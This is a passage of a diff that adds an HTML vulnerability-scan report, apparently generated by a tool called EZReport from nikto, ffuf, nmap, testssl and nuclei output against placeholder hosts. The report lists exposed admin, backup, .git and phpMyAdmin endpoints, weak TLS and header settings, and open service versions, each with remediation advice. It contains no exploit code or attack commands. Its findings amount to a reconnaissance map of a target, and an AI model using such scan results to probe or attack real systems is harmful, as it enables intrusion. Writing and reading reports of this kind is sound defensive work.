+      <h4>Remediation</h4>
+      <div class="remediation">Remove backup files from the web root. Backup files often contain source code, credentials, or configuration data and should be stored outside the document root with access controls enforced at the OS level.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>/server-status: Apache server-status page is publicly accessible. Discloses active requests, client IPs, and server load</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/server-status</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /server-status
+/server-status: Apache server-status page is publicly accessible. Discloses active requests, client IPs, and server load.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/admin</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/admin</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/admin
+Status: 200
+Length: 4823
+Words:  312</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/backup</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/backup</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/backup
+Status: 200
+Length: 1048576
+Words:  0</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/api/v1/users</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/api/v1/users</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/api/v1/users
+Status: 200
+Length: 893
+Words:  45</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/api/v1/admin/config</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/api/v1/admin/config</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/api/v1/admin/config
+Status: 200
+Length: 2341
+Words:  88</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/.git</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/.git</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/.git
+Status: 200
+Length: 23
+Words:  2</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/phpmyadmin</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/phpmyadmin</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/phpmyadmin
+Status: 200
+Length: 8912
+Words:  432</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  
+  
+  
+  
+  <h2>Low Findings</h2>
+
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Http Methods</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: http-methods
+Supported Methods: GET POST OPTIONS HEAD</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>TLS 1.1 Enabled</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-326</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: TLS1_1
+offered with final</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH &lt; 2048 bits, export-grade). Validate the new cipher-suite profile using testssl.sh after reconfiguration.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Cert Chain Of Trust</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: cert_chain_of_trust
+self-signed certificate — not trusted by common clients</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Hsts</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: HSTS
+not offered</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Cipher Order</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: cipher_order
+Server does not enforce cipher order</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Retrieved x-powered-by header: PHP/7.4.3</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /
+Retrieved x-powered-by header: PHP/7.4.3</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>The anti-clickjacking X-Frame-Options header is not present.</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /
+The anti-clickjacking X-Frame-Options header is not present.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>The X-Content-Type-Options header is not set. This could allow the browser to render the content differently.</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /
+The X-Content-Type-Options header is not set. This could allow the browser to render the content differently.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>OSVDB-877: HTTP TRACE method is active, which could allow XST (Cross-Site Tracing) attacks.</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /
+OSVDB-877: HTTP TRACE method is active, which could allow XST (Cross-Site Tracing) attacks.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/uploads</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/uploads</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/uploads
+Status: 200
+Length: 1247
+Words:  54</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-low">
+    <div class="card-header">
+      <span class="badge badge-low">low</span>
+      <h3>Discovered Endpoint: http://192.168.1.10/robots.txt</h3>
+      <small>CVSS 2.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10/robots.txt</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>ffuf</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URL:    http://192.168.1.10/robots.txt
+Status: 200
+Length: 128
+Words:  8</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  
+  
+  
+  
+  <h2>Info Findings</h2>
+
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Ssh Hostkey</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:22/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: ssh-hostkey
+2048 SHA256:abc123 (RSA)
+256 SHA256:def456 (ECDSA)</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Ssl Cert</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: ssl-cert
+Subject: commonName=web01.example-corp.local
+Issuer: commonName=Example-Corp-CA
+Public Key type: rsa
+Public Key bits: 2048
+Not valid before: 2024-01-01
+Not valid after: 2025-01-01</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Open Ports Enumeration</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>192.168.1.10</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Open ports discovered:
+22/tcp  ssh (OpenSSH 7.4
+80/tcp  http (Apache httpd 2.4.49
+443/tcp  https (Apache httpd 2.4.49
+8080/tcp  http (Apache Tomcat 9.0.1</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Open Ports Enumeration</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>192.168.1.20</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Open ports discovered:
+445/tcp  microsoft-ds (Windows Server 2016
+3389/tcp  ms-wbt-server (Microsoft Terminal Services
+135/tcp  msrpc (Microsoft Windows RPC
+139/tcp  netbios-ssn (Microsoft Windows netbios-ssn</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Open Ports Enumeration</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>192.168.1.30</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Open ports discovered:
+21/tcp  ftp (vsftpd 3.0.3
+22/tcp  ssh (OpenSSH 8.2p1
+3306/tcp  mysql (MySQL 5.7.39</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-info">
+    <div class="card-header">
+      <span class="badge badge-info">info</span>
+      <h3>Technology Disclosure via X-Powered-By Header</h3>
+      <small>CVSS 0.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10</code></td></tr>
+        <tr><td>CWE</td><td>CWE-200</td></tr>
+        
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: http://192.168.1.10/
+
+--- Response ---
+HTTP/1.1 200 OK
+X-Powered-By: PHP/7.4.3
+</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Remove or suppress the X-Powered-By header in your web server or application framework configuration.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  
+  
+
+</div>
+
+<footer class="report-footer">
+  Generated by EZReport &nbsp;·&nbsp; 2026-04-20
+</footer>
+
+</body>
+</html>
